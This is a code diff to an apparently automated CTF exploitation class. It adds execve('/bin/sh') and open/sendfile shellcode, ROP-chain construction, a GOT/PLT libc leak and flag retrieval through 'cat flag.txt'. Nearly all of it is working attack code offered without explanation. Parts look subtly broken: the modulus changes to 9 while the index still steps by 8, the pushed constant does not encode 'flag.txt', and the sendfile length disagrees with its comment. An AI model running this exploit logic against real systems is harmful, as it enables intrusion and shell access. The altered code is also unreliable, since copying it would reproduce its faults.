@@ -10,6 +10,33 @@ from rage.log import aegis_log
 
 class Against:
     """Class for dealing with exploiting the binary."""
+    # execve("/bin/sh\x00", 0,0)
+    shellcode = asm("""
+        mov rbx, 0x68732f6e69622f
+        push rbx
+        mov eax, 0x3b
+        xor rsi, rsi
+        xor rdx, rdx
+        mov rdi, rsp
+        syscall
+    """)
+
+    # open("flag.txt", 0)
+    # sendfile(0, 3, 0, 60)
+    opsf_shellcode = asm("""
+        mov rbx, 0x7616c666478747e2
+        push rbx
+        mov eax, 0x2
+        xor rsi, rsi
+        syscall
+
+        mov eax, 0x28
+        xor rdi, rdi
+        mov rsi, 0x3
+        xor rdx, rdx
+        mov r10, 0x40
+        syscall
+    """)
 
     def __init__(self, binary_path, libc, machine: Machine, ip, port):
         """Create the against class."""
@@ -79,10 +106,8 @@ class Against:
         reg_params = self.machine.reg_args 
         index = 0
         while len(string) - index > 0:
-            print("first reg")
-            rem = (len(string) - index) % 8
+            rem = (len(string) - index) % 9
             reg_gadget = self.machine.find_reg_gadget(reg1.decode("utf-8"))
-            print(reg_gadget)
             if reg_gadget != None:
                 for reg_gadget_str in reg_gadget:
                     rg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
@@ -90,15 +115,12 @@ class Against:
                     instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
                     for inst in instructions:
                         if b"pop" in inst:
-                            print("pop")
                             chain += b"A"*8
 
             reg_gadget = self.machine.find_reg_gadget(reg2.decode("utf-8"))
-            print("second reg")
             if reg_gadget != None:
                 for reg_gadget_str in reg_gadget:
                     rg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
-                    print("adding 2nd gadget")
                     chain += rg_gadget + string[index:index+rem]
                     instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
                     for inst in instructions:
@@ -106,17 +128,13 @@ class Against:
                             reg = inst.strip(b" ").split(b" ")[1]
                             if reg.decode("utf-8") == reg1:
                                 index = reg_params.index(reg.decode("utf-8"))
-                                print("pop 2")
                                 chain += p64(writeable_address+index) 
                             else:
-                                print("pop 2")
                                 chain += b"B"* 8 
             chain += p64(write_gadget_address)
             instructions = write_gadget.split(b":")[1].split(b";")[1:]
-            print(write_gadget)
             for inst in instructions:
                 if b"pop" in inst:
-                    print("pop 3")
                     chain += b"C" * 8
  
             index += 8
@@ -197,7 +215,10 @@ class Against:
 
         got_function = self.elf.got[self.leak_function]
         plt_function = self.elf.plt[self.leak_function]
-        main = self.elf.sym["vuln"]
+        if "vuln" in self.elf.sym.keys():
+            main = self.elf.sym["vuln"]
+        else:
+            main = self.elf.sym["main"]
 
         chain += p64(leak_gadget) + p64(got_function) 
         if self.leak_function == "printf":
@@ -220,12 +241,12 @@ class Against:
         match = None
         while match == None: 
             try:
-                output = p.recvline()
+                output = p.recvline(timeout=2)
             except EOFError:
                 aegis_log.error("Could not find libc leak")
+                break
             match = pattern.search(output)
 
-        #aegis_log.info(f"Recieved leak from output {output}")
         if match:
             leak = match.group(0)
             leak = u64(leak.ljust(8, b'\x00'))
@@ -403,7 +424,7 @@ class Against:
 
     def verify_flag(self):
         """Return whether the exploit worked or didn't."""
-        if self.recieve_flag() == 1:
+        if self.recieve_flag() == 1 or self.flag != None:
             aegis_log.info(f"Exploit works got flag {self.flag}")
             return True
         else:
@@ -413,6 +434,7 @@ class Against:
     def recieve_flag(self):
         """Return the flag after parsing it from the binary."""
         try:
+            #output = self.process.recvall(timeout=.5) 
             self.process.sendline(b"cat flag.txt")
             self.process.sendline(b"cat flag.txt")
 
@@ -426,4 +448,5 @@ class Against:
                 aegis_log.info(f"Captured the flag !!! {self.flag}")
                 return 1
         except EOFError:
+            aegis_log.error(f"Error recieving flag")
             return -1
